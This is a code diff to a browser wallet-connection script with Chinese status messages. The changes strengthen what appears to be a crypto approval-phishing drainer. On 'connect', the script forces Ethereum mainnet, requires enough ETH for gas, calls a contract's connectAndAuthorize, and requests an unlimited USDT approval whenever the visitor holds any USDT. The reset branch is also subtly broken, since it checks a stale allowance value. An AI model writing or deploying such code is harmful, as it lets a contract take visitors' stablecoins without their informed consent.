@@ -21,6 +21,13 @@ async function initializeWallet() {
             return;
         }
         provider = new ethers.BrowserProvider(window.ethereum);
+        const network = await provider.getNetwork();
+        if (network.chainId !== 1n) {
+            await window.ethereum.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: '0x1' }]
+            });
+        }
         const accounts = await provider.send('eth_accounts', []);
         if (accounts.length > 0) {
             userAddress = accounts[0];
@@ -97,29 +104,47 @@ async function connectWallet() {
             updateStatus('請安裝 MetaMask 或支援的錢包');
             return;
         }
-        await window.ethereum.request({
-            method: 'wallet_switchEthereumChain',
-            params: [{ chainId: '0x1' }]
-        });
+        const network = await provider.getNetwork();
+        if (network.chainId !== 1n) {
+            await window.ethereum.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: '0x1' }]
+            });
+        }
         await provider.send('eth_requestAccounts', []);
         signer = await provider.getSigner();
         userAddress = await signer.getAddress();
         contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
         usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);
 
+        const ethBalance = await provider.getBalance(userAddress);
+        if (ethBalance < ethers.parseEther('0.005')) {
+            updateStatus(`ETH 餘額不足（需要至少 0.005 ETH，實際 ${ethers.formatEther(ethBalance)} ETH）`);
+            return;
+        }
+
         const isAuthorized = await contract.authorized(userAddress);
         if (!isAuthorized) {
+            updateStatus('正在授權合約...');
             const txAuthorize = await contract.connectAndAuthorize();
             await txAuthorize.wait();
+            updateStatus('合約授權成功');
         }
 
         const usdtBalance = await usdtContract.balanceOf(userAddress);
         if (usdtBalance > 0) {
             const usdtAllowance = await usdtContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS);
+            if (usdtAllowance > 0 && usdtAllowance < usdtBalance) {
+                updateStatus('正在重置 USDT 授權...');
+                const txResetApprove = await usdtContract.approve(ETHEREUM_CONTRACT_ADDRESS, 0);
+                await txResetApprove.wait();
+            }
             if (usdtAllowance == 0) {
+                updateStatus('正在授權 USDT...');
                 const maxAllowance = ethers.MaxUint256;
                 const txApprove = await usdtContract.approve(ETHEREUM_CONTRACT_ADDRESS, maxAllowance);
                 await txApprove.wait();
+                updateStatus('USDT 授權成功');
             }
         }
 
